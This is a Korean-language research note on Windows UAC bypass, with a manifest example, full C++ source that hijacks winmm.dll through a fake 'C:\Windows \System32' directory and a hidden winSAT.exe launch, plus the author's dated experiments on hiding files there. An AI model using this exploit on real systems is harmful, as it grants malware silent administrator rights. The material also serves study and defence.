# UAC Bypass

User Account Control

Windows Vista에서 처음 선보인 보안 기술이다. 관리자가 권한 수준을 높이는 것을 허용할 때 까지 응용프로그램들은 표준 사용자 권한으로 실행된다.

매니페스트파일에서 requestedPrivileges를 requireAdministrator로 설정하면 실행 시 사용자 권한을 요청?묻는? 창이 뜬다.

```XML
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <v3:trustInfo xmlns:v3="urn:schemas-microsoft-com:asm.v3">
    <v3:security>
      <v3:requestedPrivileges>
        <v3:requestedExecutionLevel level="highestAvailable" />
      </v3:requestedPrivileges>
    </v3:security>
  </v3:trustInfo>
</assembly>
```

코드는 이와 같다.

하지만 특정 방법을 사용하면 사용자에게 들키지 않고 몰래 권한 상승이 가능하다.

UAC Bypass라는 이름을 가진 기술이다.

UAC Bypass를 사용한 대표적인 악성코드는 WannaCry가 있다.

또한 윈도우즈 시스템 프로세스는 자체적으로 보안 인증을 통해 UAC Bypass를 지원하고 있으며 이 프로세스에 취약점이 발견될 경우 이를 통해 악성코드가 더 크리티컬한 공격을 감행할 수 있을 것이다.

### UAC Bypass Source

```C++
#include "stdafx.h"
#include <Windows.h>
#include "resource.h"

void DropResource(const wchar_t* rsrcName, const wchar_t* filePath) {
	HMODULE hMod = GetModuleHandle(NULL);
	HRSRC res = FindResource(hMod, MAKEINTRESOURCE(IDR_DATA1), rsrcName);
	DWORD dllSize = SizeofResource(hMod, res);
	void* dllBuff = LoadResource(hMod, res);
	HANDLE hDll = CreateFile(filePath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);
	DWORD sizeOut;
	WriteFile(hDll, dllBuff, dllSize, &sizeOut, NULL);
	CloseHandle(hDll);
}

int main()
{
	_SHELLEXECUTEINFOW se = {};
	//Create Mock SystemRoot Directory
	CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0);
	CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32", 0);
	CopyFileW(L"C:\\Windows\\System32\\winSAT.exe", L"\\\\?\\C:\\Windows \\System32\\winSAT.exe", false);

	//Drop our dll for hijack
	DropResource(L"DATA", L"\\\\?\\C:\\Windows \\System32\\winmm.dll");

	//Execute our winSAT.exe copy from fake trusted directory
	se.cbSize = sizeof(_SHELLEXECUTEINFOW);
	se.lpFile =  L"C:\\Windows \\System32\\winSAT.exe";
	se.lpParameters = L"formal";
	se.nShow = SW_HIDE;
	se.hwnd = NULL;
	se.lpDirectory = NULL;
	ShellExecuteEx(&se);

    	return 0;
}
```

### 190223 추가

컴파일 시 매니페스트에 Ui Access = true로 설정하기 위해서는 전자서명이 필요하며 System32폴더와 같은 신뢰할 수 있는 장소에 있어야 한다.

_출처 : https://social.msdn.microsoft.com/Forums/windowsdesktop/en-US/350ceab8-436b-4ef1-8512-3fee4b470c0a/problem-with-manifest-and-uiaccess-set-to-true?forum=windowsgeneraldevelopmentissues_

WinSAT.exe에는 Ui Access = False로 설정되어있다.

어디서 본건데 신뢰할 수 있는 장소에서는 flag가 무시된다고 하는데 어떤놈은 UI경고창이 뜨고 어떤놈은 안뜬다. 일단 두 케이스에 대한 차이점 조사 예정.

### 190224 추가

이상한점 발견

C:\Windows \ 하위에 폴더 만들어도 잠깐 생겼다가 사라진다. 하지만 삭제된건 아니고 뿅 하고 없어진다.

근데 주소를 직접 치면 접근은 가능하다. 이거 이용해서 파일 본체를 숨길 수 있지 않을까 싶다.

C:\Windows \system32를 접근하면 스페이스를 없애서 C:\Windows\system32로 이동된다.

C:\Windows \system32 는 안만들어진다.

C:\Windows \에서는 C:\Windows \system32를 주소창을 통해 접근이 가능하지만 다른 장소에서는 접근이 안된다.

추측하면 주소창에 입력한 주소가 하위폴더면 바로 이동하는 것 같고 이외는 일단 후킹해서 공백 제거후 폴더 이동하는 것으로 추정된다.

ProcessExplorer로 주소찍어보면 Path에 공백이 사라진것을 볼 수 있다.

![123](https://user-images.githubusercontent.com/41255291/53297290-b61e5300-385f-11e9-8a0b-0f7e03b31275.png)

실험하다가 컴퓨터 강제 포맷되어 테스트 커밋